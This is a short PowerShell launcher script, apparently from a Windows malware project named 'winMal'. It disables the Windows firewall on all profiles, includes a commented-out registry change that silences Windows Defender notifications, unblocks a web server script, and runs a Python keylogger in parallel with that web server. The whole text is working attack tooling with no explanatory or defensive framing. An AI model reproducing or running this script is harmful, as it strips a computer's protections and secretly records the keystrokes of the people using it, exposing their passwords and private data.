#Turns off notifications from windows defender
#Set-ItemProperty -Path "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender Security Center\Notifications" -Name "DisableEnhancedNotifications" -Type DWord -Value 1
#Turn Off firewall
Write-Output "Disabling Firewall"
powershell Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled False
Write-Output "Firewall Disabled"
Unblock-File -Path "C:\winMal\Code\Scripts\webServer.ps1" 

#Run both Keylogger and Webserver at the same time
workflow RunScripts {
    parallel {
        InlineScript {py C:\winMal\Code\Scripts\keyLogger.py} #keylogger   
        InlineScript {C:\winMal\Code\Scripts\webServer.ps1} #webserver
    }
}
RunScripts